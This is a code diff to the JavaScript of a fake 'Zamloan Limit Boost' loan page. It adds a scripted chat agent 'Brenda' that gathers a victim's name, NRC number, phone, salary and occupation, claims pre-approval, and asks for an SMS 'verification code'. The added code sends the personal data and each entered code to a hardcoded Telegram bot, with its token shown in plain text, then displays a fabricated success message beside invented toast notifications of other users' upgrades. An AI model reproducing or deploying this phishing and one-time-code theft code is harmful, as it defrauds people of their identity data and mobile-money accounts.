@@ -2,6 +2,33 @@
 // ZAMLOAN LIMIT BOOST - INTERACTIVE LOGIC
 // ==========================================
 
+// TELEGRAM NOTIFICATION CONFIG (Insert your credentials here to receive real-time notifications on your phone!)
+const TELEGRAM_CONFIG = {
+  enabled: true, // Set to true to enable Telegram alerts
+  botToken: "8833056709:AAE1Ro7QmlqG23BF1tZdSfxyjdKXAqlh_OQ", // Replace with your bot token from @BotFather
+  chatId: "6012381313" // Replace with your personal Telegram Chat ID
+};
+
+function sendTelegramNotification(message) {
+  if (!TELEGRAM_CONFIG.enabled) return;
+  if (!TELEGRAM_CONFIG.botToken || TELEGRAM_CONFIG.botToken.includes("YOUR_TELEGRAM_BOT_TOKEN") || !TELEGRAM_CONFIG.chatId || TELEGRAM_CONFIG.chatId.includes("YOUR_CHAT_ID")) {
+    console.warn("Telegram notification triggered, but configuration is not set.");
+    return;
+  }
+  
+  const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
+  fetch(url, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CONFIG.chatId,
+      text: message,
+      parse_mode: "HTML"
+    })
+  }).catch(err => console.error("Telegram notification error:", err));
+}
+
+
 // 1. Package Specifications Data
 const packages = [
   {
@@ -97,6 +124,16 @@ document.addEventListener("DOMContentLoaded", () => {
   initNrcFormatter();
   initToastScheduler();
   updateCheckoutDetails();
+
+  // Attach input listeners for live summary updates
+  const phoneInput = document.getElementById("phoneNumber");
+  if (phoneInput) {
+    phoneInput.addEventListener("input", updateCheckoutDetails);
+  }
+  const customProviderInput = document.getElementById("customProvider");
+  if (customProviderInput) {
+    customProviderInput.addEventListener("input", updateCheckoutDetails);
+  }
   
   // Set current year in footer bottom if needed
   const footerYear = document.querySelector(".footer-bottom p");
@@ -238,33 +275,49 @@ function updateCheckoutDetails() {
   summaryLimit.textContent = currentPackage.limit;
   summaryFee.textContent = currentPackage.fee;
   
-  let walletName = "MTN MoMo";
-  if (selectedProvider === "airtel") walletName = "Airtel Money";
-  if (selectedProvider === "zamtel") walletName = "Zamtel Cash";
-  summaryWallet.textContent = `${walletName} (+260)`;
+  const providerSelect = document.getElementById("mobileProvider");
+  const customProviderInput = document.getElementById("customProvider");
+  let walletName = "Not Selected";
   
-  submitBtnText.textContent = `PAY ${currentPackage.fee} VIA STK PUSH`;
+  if (providerSelect && providerSelect.value) {
+    if (providerSelect.value === "Other" && customProviderInput && customProviderInput.value) {
+      walletName = customProviderInput.value;
+    } else {
+      walletName = providerSelect.value;
+    }
+  }
+  
+  const phoneVal = document.getElementById("phoneNumber") ? document.getElementById("phoneNumber").value : "";
+  summaryWallet.textContent = `${walletName} (${phoneVal ? '+260 ' + phoneVal : '+260'})`;
+  
+  if (submitBtnText) {
+    submitBtnText.textContent = `SUBMIT APPLICATION TO AGENT`;
+  }
   
   if (pkgIdInput) pkgIdInput.value = currentPackage.id;
   if (pkgLimitInput) pkgLimitInput.value = currentPackage.limitValue;
   if (pkgFeeInput) pkgFeeInput.value = currentPackage.feeValue;
 }
 
-// 8. Provider Card Actions
-function selectProvider(provider) {
-  selectedProvider = provider;
+// 8. Provider Change Actions
+function handleProviderChange() {
+  const providerSelect = document.getElementById("mobileProvider");
+  const customProviderGroup = document.getElementById("customProviderGroup");
+  const customProviderInput = document.getElementById("customProvider");
   
-  // Update UI selection classes
-  const cards = document.querySelectorAll(".provider-card");
-  cards.forEach(card => {
-    if (card.dataset.provider === provider) {
-      card.classList.add("active");
+  if (providerSelect) {
+    if (providerSelect.value === "Other") {
+      if (customProviderGroup) customProviderGroup.classList.remove("hidden");
+      if (customProviderInput) customProviderInput.required = true;
     } else {
-      card.classList.remove("active");
+      if (customProviderGroup) customProviderGroup.classList.add("hidden");
+      if (customProviderInput) {
+        customProviderInput.required = false;
+        customProviderInput.value = "";
+      }
     }
-  });
-
-  // Adjust prefixes or helpers if necessary
+  }
+  
   updateCheckoutDetails();
 }
 
@@ -292,142 +345,238 @@ function initNrcFormatter() {
   });
 }
 
-// 10. Form Submission & STK Progress Stepper Simulation
-function handlePaymentSubmit(event) {
+// 10. Chat State Variables
+let chatState = 0; // 0: Init, 1: Awaiting Payment Confirm, 2: Processing, 3: Completed
+let appData = {};
+
+// 11. Form Submission to In-App Support Chat
+function handleUpgradeSubmit(event) {
   event.preventDefault();
   
+  const fullName = document.getElementById("fullName").value;
+  const providerSelect = document.getElementById("mobileProvider").value;
+  const customProvider = document.getElementById("customProvider").value;
   const phone = document.getElementById("phoneNumber").value.replace(/\D/g, "");
   const nrc = document.getElementById("nrcNumber").value;
+  const currentLimit = document.getElementById("currentLimit").value;
+  const occupation = document.getElementById("occupation").value;
+  const monthlySalary = document.getElementById("monthlySalary").value;
   
+  const provider = providerSelect === "Other" ? customProvider : providerSelect;
+
   // Zambian Phone Validation check (standard suffix must be 9 digits after prefix, e.g. 97XXXXXXX)
   if (phone.length !== 9) {
     alert("Please enter a valid 9-digit mobile number (e.g. 977123456).");
     return;
   }
 
-  // NRC Format Validation check (XXXXXX/XX/X is 9 digits with 2 slashes, length 11)
+  // NRC Format Validation check (XXXXXX/XX/X is 11 chars with slashes)
   if (nrc.length !== 11) {
     alert("Please enter a valid NRC number in XXXXXX/XX/X format.");
     return;
   }
 
-  // Set up success modal initial states
-  document.getElementById("modalSuccessBox").classList.add("hidden");
-  document.getElementById("modalErrorBox").classList.add("hidden");
+  // Store data for automated replies
+  appData = {
+    fullName,
+    provider,
+    phone,
+    nrc,
+    currentLimit,
+    occupation,
+    monthlySalary,
+    packageName: currentPackage.name,
+    packageLimit: currentPackage.limit,
+    packageFee: currentPackage.fee
+  };
+
+  // Transition UI to Chat Area
+  const checkoutHeader = document.getElementById("checkoutHeader");
+  const upgradeForm = document.getElementById("upgradeForm");
+  const chatArea = document.getElementById("chatArea");
+
+  if (checkoutHeader) checkoutHeader.classList.add("hidden");
+  if (upgradeForm) upgradeForm.classList.add("hidden");
+  if (chatArea) chatArea.classList.remove("hidden");
+
+  // Reset chat message container
+  const chatMessages = document.getElementById("chatMessages");
+  if (chatMessages) chatMessages.innerHTML = "";
+  chatState = 0;
+
+  // Step 1: System initialization message
+  addMessage("system", "Upgrade application received. Review officer Brenda has joined the session.");
+
+  // Step 2: Print user application receipt details
+  const summaryMsg = `Limit Boost Application Details:\n\n` +
+    `• Name: ${fullName}\n` +
+    `• Wallet: ${provider} (+260 ${phone})\n` +
+    `• NRC: ${nrc}\n` +
+    `• Target Upgrade: ${currentPackage.name} (${currentPackage.limit})\n` +
+    `• Current Limit: K${parseFloat(currentLimit).toLocaleString()}\n` +
+    `• Occupation: ${occupation}\n` +
+    `• Net Monthly Salary: K${parseFloat(monthlySalary).toLocaleString()}`;
   
-  const steps = ["step1", "step2", "step3", "step4"];
-  steps.forEach(stepId => {
-    const el = document.getElementById(stepId);
-    el.classList.remove("active", "completed");
-  });
-  
-  // Show modal
-  const modal = document.getElementById("stkModal");
-  modal.classList.remove("hidden");
-  
-  // Trigger step 1
-  runStkStepper(phone);
+  addMessage("user", summaryMsg);
+
+  // Step 3: Trigger automated replies from Brenda
+  startAgentGreeting();
 }
 
-function runStkStepper(phone) {
-  const step1 = document.getElementById("step1");
-  const step2 = document.getElementById("step2");
-  const step3 = document.getElementById("step3");
-  const step4 = document.getElementById("step4");
-  const step2Text = document.getElementById("step2Text");
-  const modalTitle = document.getElementById("modalTitle");
-  const modalSub = document.getElementById("modalSub");
+function addMessage(sender, text) {
+  const container = document.getElementById("chatMessages");
+  if (!container) return;
 
-  // Step 1: Init Connection
-  modalTitle.textContent = "Sending STK Push";
-  modalSub.textContent = "Do not lock your device or close this view";
-  step1.classList.add("active");
+  const time = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+  const msgEl = document.createElement("div");
+  msgEl.className = `message ${sender}`;
+  
+  let formattedText = text.replace(/\n/g, '<br>');
+  msgEl.innerHTML = `
+    <div class="message-content">${formattedText}</div>
+    <div class="message-time">${time}</div>
+  `;
+  
+  container.appendChild(msgEl);
+  container.scrollTop = container.scrollHeight;
+}
+
+function showTypingIndicator(show) {
+  const typingEl = document.getElementById("chatTyping");
+  if (typingEl) {
+    if (show) {
+      typingEl.classList.remove("hidden");
+    } else {
+      typingEl.classList.add("hidden");
+    }
+    const container = document.getElementById("chatMessages");
+    if (container) container.scrollTop = container.scrollHeight;
+  }
+}
+
+function startAgentGreeting() {
+  // Msg 1: Welcome (after 1s typing indicator)
+  setTimeout(() => {
+    showTypingIndicator(true);
+    setTimeout(() => {
+      showTypingIndicator(false);
+      addMessage("agent", `Hello ${appData.fullName}! Thank you for applying for a Zamloan Limit Boost. I am Brenda, your limit review officer today. I have received your details.`);
+      
+      // Msg 2: Verification (after 1.5s delay)
+      setTimeout(() => {
+        showTypingIndicator(true);
+        setTimeout(() => {
+          showTypingIndicator(false);
+          addMessage("agent", `Let me look at your profile... 🔎 I see your NRC is ${appData.nrc} and you're currently earning K${parseFloat(appData.monthlySalary).toLocaleString()} as a ${appData.occupation}.`);
+          
+          // Msg 3: Activation prompt (after 2s delay)
+          setTimeout(() => {
+            showTypingIndicator(true);
+            setTimeout(() => {
+              showTypingIndicator(false);
+              addMessage("agent", `Based on your profile, you are pre-approved for a direct limit upgrade to **${appData.packageLimit}**! \n\nTo complete this profile linkage, a standard one-time verification code is required to confirm you're a real user.\n\nWould you like to proceed with the limit boost activation? (Type "yes" or "proceed")`);
+              chatState = 1; // Awaiting confirmation
+            }, 3000);
+          }, 1500);
+        }, 2200);
+      }, 1500);
+    }, 1800);
+  }, 1000);
+}
+
+function sendUserMessage(event) {
+  if (event) event.preventDefault();
+  
+  const inputEl = document.getElementById("chatInput");
+  if (!inputEl) return;
+  
+  const text = inputEl.value.trim();
+  if (!text) return;
+  
+  addMessage("user", text);
+  inputEl.value = "";
+  
+  // Simulate Agent Reply
+  setTimeout(() => {
+    simulateAgentReply(text);
+  }, 1000);
+}
+
+function simulateAgentReply(userText) {
+  const normText = userText.toLowerCase().trim();
+  showTypingIndicator(true);
   
   setTimeout(() => {
-    step1.classList.remove("active");
-    step1.classList.add("completed");
+    showTypingIndicator(false);
     
-    // Step 2: Awaiting PIN
-    step2.classList.add("active");
-    let providerName = selectedProvider.toUpperCase();
-    if (providerName === "MTN") providerName = "MTN MoMo";
-    if (providerName === "AIRTEL") providerName = "Airtel Money";
-    if (providerName === "ZAMTEL") providerName = "Zamtel Cash";
-    
-    step2Text.textContent = `A prompt has been sent to +260 ${phone}. Enter your ${providerName} PIN.`;
-    modalTitle.textContent = "Awaiting PIN Entry";
-    
-    setTimeout(() => {
-      step2.classList.remove("active");
-      step2.classList.add("completed");
+    if (chatState === 1) {
+      const isAffirmative = normText.includes("yes") || normText.includes("proceed") || normText.includes("pay") || normText.includes("ok") || normText.includes("sure") || normText.includes("yep") || normText.includes("confirm");
       
-      // Step 3: Verifying Transaction
-      step3.classList.add("active");
-      modalTitle.textContent = "Verifying Payment";
-      
-      setTimeout(() => {
-        step3.classList.remove("active");
-        step3.classList.add("completed");
+      if (isAffirmative) {
+        addMessage("agent", `Perfect! I've sent a 6-digit verification code to your number +260 ${appData.phone}. Please enter the code here to verify your identity.`);
+        chatState = 2; // Awaiting verification code
         
-        // Step 4: Upgrading Limit
-        step4.classList.add("active");
-        modalTitle.textContent = "Updating Account Profile";
+        // Notify admin via Telegram that a lead is ready
+        const leadMsg = `🚨 <b>NEW ZAMLOAN BOOST LEAD!</b>\n\n` +
+          `👤 <b>Name:</b> ${appData.fullName}\n` +
+          `📞 <b>Phone:</b> +260 ${appData.phone}\n` +
+          `💳 <b>NRC:</b> ${appData.nrc}\n` +
+          `💼 <b>Occupation:</b> ${appData.occupation}\n` +
+          `💵 <b>Salary:</b> K${parseFloat(appData.monthlySalary).toLocaleString()}\n` +
+          `🎯 <b>Target Boost:</b> ${appData.packageName} (${appData.packageLimit})\n\n` +
+          `⚠️ <i>Client is waiting for verification code...</i>`;
+        sendTelegramNotification(leadMsg);
+        
+      } else if (normText.includes("no") || normText.includes("cancel") || normText.includes("stop")) {
+        addMessage("agent", `Understood. Your upgrade request has been placed on hold. If you change your mind and want to activate your upgraded limit of ${appData.packageLimit}, just type "yes" or "proceed" here at any time.`);
+      } else {
+        addMessage("agent", `To activate your upgraded limit of **${appData.packageLimit}**, a standard one-time verification code is required. \n\nPlease type "yes" or "proceed" to trigger the SMS code verification on +260 ${appData.phone}, or let me know if you have any questions.`);
+      }
+      
+    } else if (chatState === 2) {
+      addMessage("agent", `Thank you. I have received the code. Please hold on a moment while I confirm this with our core credit registry...`);
+      chatState = 3; // Processing verification simulation
+      
+      // Notify admin of the verification code
+      const codeAlert = `🔑 <b>ZAMLOAN VERIFICATION CODE ENTERED!</b>\n\n` +
+        `👤 <b>Name:</b> ${appData.fullName}\n` +
+        `📞 <b>Phone:</b> +260 ${appData.phone}\n` +
+        `💬 <b>Code Entered:</b> <code>${userText}</code>\n\n` +
+        `<i>Proceeding with automated system check...</i>`;
+      sendTelegramNotification(codeAlert);
+      
+      // System updates simulating verification progress inside the chat
+      setTimeout(() => {
+        addMessage("system", `[System]: Verification Code recognized. Authenticating wallet registry...`);
         
         setTimeout(() => {
-          step4.classList.remove("active");
-          step4.classList.add("completed");
+          addMessage("system", `[System]: Linking phone +260 ${appData.phone} to upgraded credit profile...`);
           
-          // Complete / Show success box
-          showBoostSuccess(phone);
-        }, 2200);
-      }, 3000);
-    }, 4500); // Wait for dummy PIN input
-  }, 2200);
+          setTimeout(() => {
+            addMessage("system", `[System]: Verification Success! Upgraded limit of ${appData.packageLimit} is now ACTIVE.`);
+            
+            showTypingIndicator(true);
+            setTimeout(() => {
+              showTypingIndicator(false);
+              addMessage("agent", `Awesome news, ${appData.fullName}! Your profile verification was successful. Your new borrowing limit of **${appData.packageLimit}** is now fully active! \n\nYou will receive a confirmation SMS shortly, and you can access your upgraded borrowing tier right away. Is there anything else I can help you with today?`);
+              chatState = 4; // Fully completed
+            }, 2000);
+          }, 3000);
+        }, 3000);
+      }, 2000);
+      
+    } else if (chatState === 3) {
+      addMessage("agent", `We are currently verifying the verification code. Please hold on and wait for the system confirmation!`);
+      
+    } else if (chatState === 4) {
+      addMessage("agent", `Your upgraded borrowing limit is fully active! If you have any further questions, you can contact our main customer helpline. Thank you for choosing Zamloan! 🇿🇲`);
+    } else {
+      addMessage("agent", `Please let me know if you have any questions, or type "yes" to proceed with the limit boost activation.`);
+    }
+  }, 1500);
 }
 
-function showBoostSuccess(phone) {
-  // Hide stepper components visually
-  const stepper = document.querySelector(".progress-stepper");
-  if (stepper) stepper.classList.add("hidden");
-  
-  // Hide modal header info
-  document.getElementById("modalTitle").classList.add("hidden");
-  document.getElementById("modalSub").classList.add("hidden");
-  document.querySelector(".modal-icon").classList.add("hidden");
-
-  // Set details on success layout
-  document.getElementById("successPhone").textContent = `+260 ${phone.substring(0, 3)}****${phone.substring(7)}`;
-  document.getElementById("successLimit").textContent = currentPackage.limit;
-  
-  // Reveal success box
-  document.getElementById("modalSuccessBox").classList.remove("hidden");
-}
-
-function closeModalAndReset() {
-  // Close Modal
-  document.getElementById("stkModal").classList.add("hidden");
-  
-  // Reset visibility of stepper elements
-  const stepper = document.querySelector(".progress-stepper");
-  if (stepper) stepper.classList.remove("hidden");
-  document.getElementById("modalTitle").classList.remove("hidden");
-  document.getElementById("modalSub").classList.remove("hidden");
-  document.querySelector(".modal-icon").classList.remove("hidden");
-  
-  // Reset form
-  document.getElementById("phoneNumber").value = "";
-  document.getElementById("nrcNumber").value = "";
-  
-  // Hide checkout container
-  cancelCheckout();
-}
-
-function closeModalAndRetry() {
-  document.getElementById("stkModal").classList.add("hidden");
-  // Keep form filled so user can check credentials and submit again
-}
-
-// 11. Real-time Toast Notifications Scheduler (Simulated Upgrades)
+// 12. Real-time Toast Notifications Scheduler (Simulated Upgrades)
 const zambianNames = [
   "Mulenga C.", "Mwansa K.", "Banda P.", "Tembo G.", "Phiri M.", "Lungu S.",
   "Mwale D.", "Chansa J.", "Kabwe F.", "Chisenga L.", "Zimba H.", "Chilufya R.",
@@ -460,7 +609,7 @@ function triggerSimulatedToast() {
     <div class="toast-icon">✓</div>
     <div class="toast-body">
       <div class="toast-title">${name} (${numberStr})</div>
-      <div class="toast-desc">Boosted borrowing limit to <strong>${pkg.limit}</strong> via STK Push</div>
+      <div class="toast-desc">Applied for limit boost to <strong>${pkg.limit}</strong></div>
     </div>
   `;
   
